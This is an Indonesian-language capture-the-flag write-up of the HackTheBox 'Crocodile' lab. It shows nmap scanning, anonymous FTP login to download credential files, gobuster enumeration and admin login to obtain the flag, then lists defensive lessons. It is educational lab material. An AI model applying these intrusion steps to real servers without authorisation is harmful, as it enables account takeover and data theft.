# HTB Crocodile — Anonymous FTP + Credential Exposure

**Date:** 2026-05-04
**Platform:** HackTheBox Starting Point
**Difficulty:** Very Easy
**Category:** Network / Web

---

## Target

Mesin Linux bernama Crocodile dari HTB Starting Point Tier 1. Menjalankan FTP server (vsftpd 3.0.3) dan Apache HTTP Server. Celah utama berasal dari misconfiguration FTP yang membiarkan anonymous login aktif, sehingga siapapun bisa mengakses file credentials tanpa autentikasi.

## Vulnerability

1. **Anonymous FTP Login** — Server FTP mengizinkan siapapun masuk tanpa username/password valid. Ini adalah misconfiguration yang sering terjadi ketika admin lupa menonaktifkan fitur anonymous access setelah setup.
2. **Credential Exposure** — File berisi username dan password disimpan di direktori FTP yang bisa diakses publik.
3. **No Login Protection** — Halaman login web tidak memiliki rate limiting atau proteksi brute force.

## Tools Used

- Nmap (port scanning & service detection)
- FTP client bawaan Linux
- Gobuster (directory & file enumeration)
- Browser (Firefox di Kali)

---

## Exploitation Steps

### Step 1 — Reconnaissance dengan Nmap

Scan port dan deteksi service yang berjalan di target.

```bash
nmap -sC -sV -v 10.129.1.15
```

Hasil penting dari scan:
- Port 21 terbuka → FTP vsftpd 3.0.3
- Script `ftp-anon` mendeteksi anonymous login diizinkan
- Dua file terlihat di direktori FTP: `allowed.userlist` dan `allowed.userlist.passwd`

---

### Step 2 — Anonymous FTP Login & Download Credentials

Masuk ke FTP server tanpa credentials valid.

```bash
ftp 10.129.1.15
# Name: anonymous
# Password: (enter kosong)
```

Setelah masuk, download kedua file yang ditemukan Nmap:

```bash
ls
get allowed.userlist
get allowed.userlist.passwd
bye
```

Baca isi file:

```bash
cat allowed.userlist
cat allowed.userlist.passwd
```

Ditemukan daftar username dan password yang terdiri dari beberapa akun. Username dengan privilege tertinggi yang terlihat adalah `admin`.

---

### Step 3 — Web Enumeration dengan Nmap & Gobuster

Scan ulang untuk menemukan web server:

```bash
nmap -sC -sV 10.129.1.15
```

Port 80 terbuka dengan Apache HTTP Server. Selanjutnya gunakan Gobuster untuk menemukan halaman tersembunyi:

```bash
gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Hasil Gobuster:
- `login.php` → Status 200 (ada dan bisa diakses langsung)
- `assets/`, `css/`, `js/` → Status 301 (folder biasa)

---

### Step 4 — Login ke Web & Ambil Flag

Buka browser dan akses halaman login yang ditemukan:

```
http://10.129.1.15/login.php
```

Login menggunakan credentials akun admin yang didapat dari file FTP. Setelah berhasil login, dashboard langsung menampilkan flag.

---

## Proof

```
Flag: c7110277ac44d78b6a9fff2232434d16
```

---

## Lessons Learned

- **Anonymous FTP adalah misconfiguration serius** — selalu disable anonymous access di production server kecuali memang dibutuhkan untuk distribusi file publik
- **Gobuster bukan brute force login** — ini adalah directory enumeration, teknik yang berbeda. Brute force login menggunakan tool seperti Hydra
- **Flag `-x` di Gobuster** digunakan untuk memfilter ekstensi file tertentu (contoh: `-x php` hanya cari file `.php`)
- **HTTP Status Code penting dihapal** — 200 berarti halaman ada dan bisa diakses, 301 redirect, 403 forbidden tapi ada, 404 tidak ada sama sekali
- **Nmap script `ftp-anon`** secara otomatis mencoba anonymous login dan melaporkan hasilnya beserta isi direktori — informasi ini sangat berharga di tahap awal reconnaissance
- Urutan attack pada mesin ini mengikuti metodologi pentest standar: Reconnaissance → Enumeration → Exploitation